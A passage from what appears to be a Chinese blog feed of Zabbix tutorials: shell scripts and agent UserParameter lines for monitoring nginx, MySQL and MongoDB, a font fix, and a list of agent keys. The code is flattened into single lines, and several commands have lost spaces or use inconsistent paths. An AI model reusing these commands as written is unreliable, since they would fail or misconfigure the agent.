"http://localhost/nginx_status"| awk NR==3| awk '&#123;print $1&#125;'&#125;function handled &#123;curl -s "http://localhost/nginx_status"| awk NR==3| awk '&#123;print $2&#125;'&#125;function requests &#123;curl -s "http://localhost/nginx_status"| awk NR==3| awk '&#123;print $3&#125;'&#125;# Run the requested function case "$1" inactive)active;;reading)reading;;writing)writing;;waiting)waiting;;accepts)accepts;;handled)handled;;requests)requests;;*)echo "Usage: $0 &#123;nginx_site_dicovery&#125;"echo "Usage: $0 &#123;active [host] | reading [host] | writing [host] | waiting [host] | accepts [host] | handled [host] | requests [host]&#125;"esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改该文件的属主和属组为zabbix，并且具有执行权限 12chown zabbix.zabbix /usr/local/zabbix-2.4.4/scripts/nginx_status.shchmod 755 /usr/local/zabbix-2.4.4/scripts/nginx_status.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在zabbix_agentd.conf配置文件中添加如下代码 12345678#monitor nginxUserParameter=nginx.accepts,/usr/local/etc/nginx_status.sh acceptsUserParameter=nginx.handled,/usr/local/etc/nginx_status.sh handledUserParameter=nginx.requests,/usr/local/etc/nginx_status.sh requestsUserParameter=nginx.connections.active,/usr/local/etc/nginx_status.sh activeUserParameter=nginx.connections.reading,/usr/local/etc/nginx_status.sh readingUserParameter=nginx.connections.writing,/usr/local/etc/nginx_status.sh writingUserParameter=nginx.connections.waiting,/usr/local/etc/nginx_status.sh waiting &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这段代码可以视自己目录情况而改变 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建好了之后就可以在web页面配置item监控项了]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix监控mysql数据库状态]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F14.%20zabbix%E7%9B%91%E6%8E%A7mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[zabbix监控mysql数据库状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Zabbix自己提供的模板可以监控mysql slow queries,mysqlversion,uptime,alive等。 Zabbix官方提供的监控mysql的模板Template AppMySQL,可以看到相关的Items和key。 把该模板Template App MySQL Link到相关的主机上面,发现Item的Status是不可用的，因为key的值是通过Mysql用户查看”showglobal status”信息或者用mysqladmin命令查看status或extended-status的信息而取的值。 12mysql&gt; show global status; mysql&gt; show status; 结合官方提供的key编写Shell脚本，从数据库中取出Items的key的值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/bin/sh#Create by huxianglin 2015.04.14MYSQL_SOCK="/tmp/mysql.sock"MYSQL_PWD=xxxxxxsource /etc/profile.d/mysqld.shARGS=1if [ $# -ne "$ARGS" ];thenecho "Please input onearguement:"ficase $1 inUptime)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK status|cut -f2 -d":"|cut -f1 -d"T"`echo $result;;Com_update)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_update"|cut -d"|" -f3`echo $result;;Slow_queries)result=`mysqladmin -uroot -p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK status |cut -f5 -d":"|cut -f1 -d"O"`echo $result;;Com_select)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_select"|cut -d"|" -f3`echo $result;;Com_rollback)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_rollback"|cut -d"|" -f3`echo $result;;Questions)result=`mysqladmin -uroot -p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK status|cut -f4 -d":"|cut -f1 -d"S"`echo $result;;Com_insert)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_insert"|cut -d"|" -f3`echo $result;;Com_delete)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_delete"|cut -d"|" -f3`echo $result;;Com_commit)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_commit"|cut -d"|" -f3`echo $result;;Bytes_sent)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Bytes_sent"|cut -d"|" -f3`echo $result;;Bytes_received)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Bytes_received" |cut -d"|" -f3`echo $result;;Com_begin)result=`mysqladmin -uroot-p$&#123;MYSQL_PWD&#125; -S $MYSQL_SOCK extended-status |grep -w "Com_begin"|cut -d"|" -f3`echo $result;;*)echo"Usage:$0(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions)";;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改权限chmod 755 /etc/zabbix-2.4.4/scripts/checkmysqlperformance.sh 在Zabbix_agentd.conf里面添加UserParameter，格式如下，对于Zabbix来说，脚本其实就是一个插件。 UserParameter=mysql.version,mysql -V UserParameter=mysql.ping,mysqladmin -uroot -pxxxxxx -S /tmp/mysql.sock ping | grep -c alive UserParameter=mysql.status[*],/etc/zabbix-2.4.4/scripts/checkmysqlperformance.sh $1 $2 重启agentd服务器，然后在zabbix server中添加模板Template AppMySQL。 在zabbix前端可以实时查看SQL语句每秒钟的操作次数。 在zabbix前端可以实时查看mysql发送接收的字节数。其中bytes received表示从所有客户端接收到的字节数，bytes sent表示发送给所有客户端的字节数。 总结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把该脚本放到要监控的服务器上面（Modifymysql user and password），修改UserParameter的参数并重启agentd,Link官方提供的Template App MySQL模板即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里是测试环境用root账号，线上服务器安全期间可以给mysql用户授权readonly权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据实际的需求，除了监控上述监控项之外，还可以监控mysqlprocesslist,Innodb等。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix监控mongodb]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F13.%20zabbix%E7%9B%91%E6%8E%A7mongodb%2F</url>
    <content type="text"><![CDATA[zabbix监控mongodb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mongodb的监控，下面是部署过程： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一步，先在zabbix_agentd.conf中追加下面的内容，主要是调用mongo这个工具通过db.serverStatus()函数获取mongodb的状态，这里需要注意的是连接的IP和端口不能配置错误，最好是要检查一下mongodb的配置文件里面的IP和端口是否一致： 123456789101112131415161718#monitor mongodbUserParameter=mongo.service,ps -ef | grep mongo |grep -v grep |wc -lUserParameter=mongo.mem_resident,echo "db.serverStatus().mem"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|grep resident | cut -d ":" -f 2 |cut -d "," -f 1| cut -d " " -f 2UserParameter=mongo.mem_virtual,echo "db.serverStatus().mem"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|grep virtual | cut -d ":" -f 2 |cut -d "," -f 1| cut -d " " -f 2UserParameter=mongo.mem_mapped,echo "db.serverStatus().mem"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|grep '\bmapped\b' | cut -d ":" -f 2 |cut -d "," -f 1| cut -d " " -f 2UserParameter=mongo.network[*],echo "db.serverStatus().network"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017| grep $1 | cut -d ":" -f 2 |cut -d "," -f1 |cut -d " " -f 2UserParameter=mongo.index[*],echo "db.serverStatus().indexCounters"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017| grep $1| cut -d ":" -f 2 |cut -d "," -f1 |cut -d " " -f 2UserParameter=mongo.connection_current,echo "db.serverStatus().connections"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017| grep current|cut -d ":" -f 2|cut -d "," -f 1|cut -d " " -f 2UserParameter=mongo.connection_available,echo "db.serverStatus().connections"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017| grep current| cut -d ":" -f 3|cut -d "," -f 1 |cut -d " " -f 2UserParameter=mongo.opcounters[*],echo "db.serverStatus().opcounters" |/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017| grep $1|cut -d ":" -f 2|cut -d "," -f 1 |cut -d " " -f 2UserParameter=mongo.rpstatus,echo "rs.status()"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017| grep myState| cut -d ":" -f 2| cut -d "," -f 1 |cut -d " " -f 2UserParameter=mongo.queue_write,echo "db.serverStatus().globalLock.currentQueue.writers"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 3pUserParameter=mongo.queue_reader,echo "db.serverStatus().globalLock.currentQueue.readers"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 3pUserParameter=mongo.backgroundFlush,echo "db.serverStatus().backgroundFlushing.last_ms" |/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 3pUserParameter=mongo.curosor_Totalopen,echo "db.serverStatus().cursors.totalOpen" |/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 3pUserParameter=mongo.curospr_timedOu,echo "db.serverStatus().cursors.timedOut" |/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 3pUserParameter=mongo.pagefaults,echo "db.serverStatus().extra_info.page_faults" |/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 3pUserParameter=mongo.oplog_storetime,echo "db.printReplicationInfo()"|/data/mongodb/mongodb/bin/mongo 127.0.0.1:27017|sed -n 4p|cut -d "(" -f 2|cut -d "h" -f 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;追加完成后重启zabbix_agentd然后在zabbix_server端使用zabbix_get尝试是否能够获取到数据，如果能获取到数据说明客户端已经配置好了，接下来配置服务端，将下面提供的模板导入，然后添加相应主机到模版中就行了。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix2.2图形中有乱码（方框）的问题]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F12.%20zabbix2.2%E5%9B%BE%E5%BD%A2%E4%B8%AD%E6%9C%89%E4%B9%B1%E7%A0%81%EF%BC%88%E6%96%B9%E6%A1%86%EF%BC%89%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[zabbix2.2图形中有乱码（方框）的问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个是字体的问题，解决办法如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum 安装的zabbix 字体并不是在 /usr/share/zabbix/fonts下而是在/usr/share/zabbix/fonts/dejavu 下，具体配置可以通过查看配置文件：/usr/share/zabbix/include/defines.inc.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要搞一个中文字体放到这里来，虽然这个目录下有个 DejaVuSans.ttf 但是不管用，从windows上的 C:\windows\fonts\ 目录下拷贝文件 simfang.ttf 到 /usr/share/zabbix/fonts/dejavu 目录下，然后修改名字 12mv DejaVuSans.ttf DejaVuSans.ttf.bak mv simfang.ttf DejaVuSans.ttf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以了。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix agent 类型所有key]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F11.%20zabbix%20agent%20%E7%B1%BB%E5%9E%8B%E6%89%80%E6%9C%89key%2F</url>
    <content type="text"><![CDATA[zabbix agent 类型所有key&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix服务器端通过与zabbix agent通信来获取客户端服务器的数据，agent分为两个版本，在配置主机我们可以看到一个是agent，另一个是agent（active）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;agent：zabbix server向zabbix agent讨要数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;agent（active）：zabbix agent提交数据给zabbix server。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;监控项keys列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下表格是zabbix agent所支持的所有key列表，添加一向监控的时候，首先想到的应该是zabbix agent是否已经有相关的key存在，而不是自己去写脚本来获取key。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;agent.hostname&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回被监控端名称(字符串) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;agent.ping&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测被监控端是否存活(1:运行中 其他:未运行)-使用函数 nodata()检测客户端是否正在运行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;agent.version&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix agent版本字符串 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;kernel.maxfiles&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统支持最大的open files整数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;kernel.maxproc&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统支持最大的进程数量整数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log[file,,,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;监控日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 文件详细路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;regexp - 正则&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;encoding - 编码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;maxlines - zabbix agent向server或者proxy发送最大的行数。这个参数覆盖配置文件zabbxi_agentd.conf中的’MaxLinesPerSecond’&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可选值:all (默认), skip (跳过处理老数据).mode参数从2.0版本开始支持&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;output - 可选项，输出格式模板.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例: log[/var/log/syslog] log[/var/log/syslog,error] log[/home/zabbix/logs/logfile,,,100] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrt[file_pattern,,,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Monitoring of log file with log rotation support.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file_pattern - 文件绝对路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.dns[,zone,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测DNS服务是否开启0 – DNS挂了 1 - DNS运行中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip - DNS服务器的ip地址(留空表示使用本地DNS, ignored onWindows)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zone - 需要测试的域名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - 记录类型 (默认为 SOA),type可选值: ANY, A, NS, CNAME, MB, MG, MR, PTR, MD, MF, MX, SOA, NULL, WKS (除了windows), HINFO, MINFO, TXT, SRV SRV&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;timeout (ignored on Windows) – 超时时间(默认1秒)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;count (ignored on Windows) – 重试次数 (默认值2)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: net.dns[8.8.8.8,zabbix.com,MX,2,1] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.dns.record[,zone,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行一个DNS查询获取DNS查询数据.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip - DNS服务器的ip地址(留空表示使用本地DNS, ignored on Windows)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zone - 需要测试的域名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - 记录类型 (默认SOA,可选值同net.dns)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;timeout (ignored on Windows) – 超时时间(默认1秒)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;count (ignored on Windows) – 重试次数 (默认值2)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: net.dns.record[8.8.8.8,ttlsa.com,MX,2,1] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.if.collisions[if]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Out-of-window collision.Number of collisions. Integer.if - 网卡 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.if.discovery&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出网卡.通常用于低级别的discovery.JSON对象 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.if.in[if,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网卡入口流量整数.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if - 网卡名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可用值: bytes - 字节数 (默认)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;packets - 包数量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;errors - 错误数量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dropped - 丢包数量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例keys: net.if.in[eth0,errors] net.if.in[eth0] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.if.out[if,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网卡出口流量（参数参见net.if.in） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.if.total[if,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网卡进/出流量的总和（参数参见net.if.in） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.tcp.listen[port]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测端口是否开启0 – （not listen） 1 – in LISTEN stateport&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例: net.tcp.listen[80] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.tcp.port[,port]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否可以连接到指定的TCP端口0 – cannot connect 1 – can connect&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ip - IP地址(默认是 127.0.0.1)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; port - 端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例: net.tcp.port[,80] 检测web服务器端口是否运行中 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.tcp.service[service,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测服务是否开启，并且端口可用0 – 服务挂了 1 – 服务运行中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; service - 如下:ssh, ntp, ldap, smtp, ftp, http, pop, nntp,imap, tcp, https, telnet&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ip - IP地址 (默认127.0.0.1)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; port - 端口 (默认情况为标准端口号)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: net.tcp.service[ftp,,45] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.tcp.service.perf[service,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测服务器性能0 – 服务挂了; seconds – 链接到服务器端口消耗的时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;service - 如下:ssh, ntp, ldap, smtp, ftp, http, pop, nntp,imap, tcp, https, telnet&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip - IP地址 (默认127.0.0.1)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;port - 端口 (默认情况为标准端口号)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: net.tcp.service.perf[ssh]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;net.udp.listen[port] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;proc.mem[,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户进程消耗的内存内存使用量 (字节单位).&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;name - 进程名 (默认值 “all processes”)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;user - 用户名 (默认值“all users”)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可选值: avg, max, min, sum (默认)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cmdline - 命令行过滤(正则表达时)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例keys: proc.mem[,root] – root的进程消耗了多少内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; proc.mem[zabbix_server,zabbix] – zabbix用户运行的zabbix_server使用了多少内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; proc.mem[,oracle,max,oracleZABBIX] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;proc.num[,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;某用户某些状态的进程的数量进程数量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;name - 进程名称 (默认“all processes”)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;user - 用户名 (默认 “all users”)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;state - 可用值: all (默认), run,sleep, zomb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cmdline - 命令行过滤(正则表达时)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例keys: proc.num[,mysql] – MySQL用户运行的进程数量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;proc.num[apache2,www-data] – www-data运行了多少个apache2进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;proc.num[,oracle,sleep,oracleZABBIX]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：Windows系统只支持name和user两个参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sensor[device,sensor,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读取硬件传感器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;device - 设备名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sensor - 传感器名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可选值:avg, max, min&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: sensor[w83781d-i2c-0-2d,temp1] Prior to Zabbix 1.8.4, the sensor[temp1] format was used. On Linux 2.6+, 读取/sys/class/hwmon. On OpenBSD, 读取hw.sensors MIB.示例keys: sensor[cpu0,temp0] – CPU0的温度 sensor[cpu[0-2]$,temp,avg] – cpu平均温度Zabbix 1.8.4开始支持OpenBSD &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.boottime&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统启动的时间戳整数.unix时间戳 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.cpu.intr&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设备中断整数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.cpu.load[,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CPU负载浮点数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cpu - 可用值: all (默认), percpu (所有在线cpu的负载)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可用值:avg1 (1分钟 默认值), avg5(5分钟平均), avg15 (15分钟平均值)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例key: system.cpu.load[,avg5] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.cpu.num[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CPU数量处理器个数type - 可用值: online (默认值), max范例: system.cpu.num &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.cpu.switches&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上下文交换交换次数老命名方式: system[switches] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.cpu.util[,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CPU利用率百分比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cpu - cpu数量 (默认是所有cpu)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - 可用值: idle, nice, user (默认), system (windows系统默认值）, iowait, interrupt, softirq,steal&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可用值: avg1 (一分钟平均，默认值), avg5(5分钟平均, avg15 (15分钟平均值)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例key: system.cpu.util[0,user,avg5] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.hostname[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回主机名字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type (仅用于windows系统) – 可用值: netbios(默认) or host &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.hw.chassis[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回机架信息字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;info - full (默认), model, serial, type 或vendor&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: system.hw.chassis&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Hewlett-Packard HP Pro 3010 Small Form Factor PC CZXXXXXXXX Desktop]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：要root权限，因为这些信息是从内存中读取的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.hw.cpu[,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回CPU信息字符/数字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cpu - cpu数量或者all (默认)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;info - full (默认), curfreq, maxfreq, model 或者vendor&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: system.hw.cpu[0,vendor] AuthenticAMD 从/proc/cpuinfo、/sys/devices/system/cpu/[cpunum]/cpufreq/cpuinfo_max_freq获取信息. 如果指定了CPU数量和 curfreq或者maxfreq, 将会返回数值(Hz). &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.hw.devices[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出PCI或者USB文本值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - pci (默认) or usb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例: system.hw.devices[pci] 00:00.0 Host bridge: Advanced Micro Devices [AMD] RS780 Host Bridge [..] 返回lspci或者lsusb (不带参数) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.hw.macaddr[,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出MAC地址字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;interface - all (默认) 或者正则表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;format - full (默认) 、short&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例: system.hw.macaddr[“eth0$”,full] [eth0] 00:11:22:33:44:55 列出指定接口mac地址 如果format指定为short，MAC地址相同的将会被忽略掉 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.localtime[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统时间.数字或者字符串 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.run[command,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在制定的主机上运行命令文本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;command - 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - wait (默认值, 执行超时时间), nowait (不等待)最大可用返回512KB数据，包含空白数据。 命令输出数据必须是文本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: system.run[ls -l /] – 列出/的文件和目录.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Note: 启用这个方法, agent配置文件必须配置 EnableRemoteCommands=1选项 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.stat[resource,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;虚拟内存状态数字ent &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.sw.arch&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回软件信息字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例: system.sw.arch i686 